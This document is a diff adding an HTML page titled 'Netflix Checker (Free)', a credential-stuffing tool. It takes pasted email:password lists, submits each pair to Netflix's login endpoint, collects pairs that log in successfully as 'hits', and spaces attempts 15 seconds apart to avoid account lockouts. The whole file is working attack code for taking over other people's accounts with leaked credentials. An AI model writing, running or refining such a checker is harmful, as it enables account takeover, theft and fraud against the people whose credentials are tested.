@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Netflix Checker</title>
+  <style>
+    body { background: #000; color: #e50914; font-family: Arial; }
+    textarea, button { margin: 10px; padding: 10px; width: 90%; }
+  </style>
+</head>
+<body>
+  <h1>💀 Netflix Checker (Free)</h1>
+  <textarea id="creds" placeholder="email:password
+email:password"></textarea><br>
+  <button onclick="start()">Start Testing</button>
+  <textarea id="hits" placeholder="Valid accounts appear here..." style="height:200px;"></textarea>
+
+  <script>
+    async function login(email, password) {
+      const form = new FormData();
+      form.append('userLoginId', email);
+      form.append('password', password);
+      form.append('rememberMe', 'true');
+
+      const res = await fetch('https://www.netflix.com/login', {
+        method: 'POST',
+        credentials: 'include',
+        body: form,
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      });
+
+      // If redirected to /browse → success
+      if (res.redirected && res.url.includes('/browse')) {
+        document.getElementById('hits').value += email + ':' + password + '\n';
+        return true;
+      }
+      return false;
+    }
+
+    async function start() {
+      const lines = document.getElementById('creds').value.trim().split('\n');
+      for (let line of lines) {
+        if (!line.includes(':')) continue;
+        const [email, password] = line.split(':', 2);
+
+        try {
+          const success = await login(email, password);
+          if (success) console.log('✅ HIT:', email);
+          else console.log('❌ FAIL:', email);
+        } catch (e) {
+          console.log('⚠️ SKIP:', e.message);
+        }
+        await new Promise(r => setTimeout(r, 15000)); // 15s delay = avoid lock
+      }
+    }
+  </script>
+</body>
+</html>
